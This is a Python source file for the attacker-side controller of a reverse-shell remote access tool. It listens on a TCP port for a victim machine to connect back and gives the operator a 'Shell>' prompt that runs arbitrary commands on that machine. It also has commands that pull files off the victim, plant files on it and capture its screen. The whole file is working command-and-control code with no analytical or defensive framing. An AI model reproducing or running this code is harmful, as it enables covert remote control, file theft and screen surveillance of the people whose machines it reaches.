import socket
import os
import time

def doGrab(conn, cmd, operation):
    try:
        conn.send(cmd.encode()) #send command to client
        if operation == 'grab':
            parts = cmd.split("*")
            if len(parts) < 2:
                print("[+] Invalid grab command format")
                return
            grab, sourcePathFilename = parts

        save_dir = "/home/user/Desktop/grabfiles/"
        os.makedirs(save_dir, exist_ok=True)
        fileName = "grabbed_" + os.path.basename(sourcePathFilename)
        filePath = os.path.join(save_dir, fileName)

        with open(filePath, 'ab') as f:
            while True:
                bits = conn.recv(1024)
                if not bits:
                    break
                if bits.endswith(b'DONE'):
                    f.write(bits[:-4])
                    print("[+] Transfer Complete")
                    break
                if b'File not found' in bits:
                    print("[-] File not found")
                    return
                f.write(bits)
        print(f"[+] File saved as: {fileName}")
        print(f"location: {save_dir}")

    except Exception as e:
        conn.send(f'[-] Error in file transfer: {e}'.encode())

def doSend(conn, sourcePath, destination, fileName):
    try:
        fullPath = os.path.join(sourcePath, fileName)
        print(f"[~] Looking for the file: {fullPath}")
        # build the full file path (Safely joins even if the \ or / os missing)
        if not os.path.isfile(fullPath):
            conn.send(b'File not found')
            print(f"[-] File not found :( {fullPath}")
            # Prompt for corrected input:
            corrected_source = input("Enter correct source path: ").strip()
            corrected_fileName = input("Enter correct file name: ").strip()
            # Rebuild the full file path using corrected inputs:
            fullPath = os.path.join(corrected_source, corrected_fileName)
            # Optionally, also update destination or send a corrected command to the client
            # For this example, we assume you're just updating the file path and trying again.
            if not os.path.isfile(fullPath):
                conn.send(b'File not found')
                print(f"[-] Corrected file still not found: {fullPath}")
                return
            else:
                print(f"[~] Corrected file found: {fullPath}")
        if os.path.getsize(fullPath) == 0:
            conn.send(b'File is empty')
            print(f"[-] {fullPath} is empty.")
            return
        #send file data
        with open(fullPath, 'rb') as sourceFile:
            while True:
                packet = sourceFile.read(1024)
                if not packet:
                    break
                conn.send(packet)
            conn.send(b'DONE')
        print("[+] File Transfer Completed")

    except Exception as e:
        conn.send(b'File Transfer error')
        print(f"[-] Error occurred during file send {e}")

def transfer(conn, cmd, operation):
    conn.send(cmd.encode())

    if (operation == "grab"):
        grab, path = cmd.split("*")
        f = open('/home/user/Desktop/' + path, 'wb')

    if (operation == "screencap"):
        fileName = f"ScreenCapture_{time.strftime('%m%d%Y_%H%M%S')}.jpg"
        f = open('/home/user/Desktop/ScreenCaptures/'+fileName, 'wb')

    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print("[+] Transfer Complete")
            break
        if 'File not found'.encode() in bits:
            print("[-] Unable to find the file")
            break
        f.write(bits)

    print("file written to: /home/user/Desktop/ScreenCaptures/")

def conn():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.80.132",8080))
    print("=" * 53)
    print("[+] Listening for incoming TCP connection on port 8080")
    s.listen(1)
    conn, addr = s.accept()
    print("[+] We got a connection from ", addr)

    while True:
        cmd = input("Shell> : ")
        if "terminate" in cmd:
            conn.send("terminate".encode())
            conn.close()
            break

        # command format: grab*<filepath>
        # Example: grab*C:\Users\John\Desktop\photo.jpg
        elif cmd.startswith('grab'):
            doGrab(conn, cmd, "grab")

        # command format: send*<destination path>*<File Name>
        # example: send*C:\Users\John\Desktop\*photo.jpeg
        # source file in Linux. Example: /home/user/Desktop
        elif cmd.startswith('send'):
            try:
                command, destination, fileName, = cmd.split('*')
            except ValueError:
                print("[-] Invalid send command format. Use: send*<destination>*<filename>")
                continue
            source = input("Source path: ")
            conn.send(cmd.encode())
            doSend(conn, source, destination, fileName)

        elif 'screencap' in cmd:
            transfer(conn, cmd, "screencap")


        else:
            conn.send(cmd.encode())
            try:
                print(conn.recv(1024).decode(errors='ignore'))
            except Exception as e:
                print(f"[-] Error: Unable to decode received response {e}.")

def main():
    conn()

if __name__ == '__main__':
    main()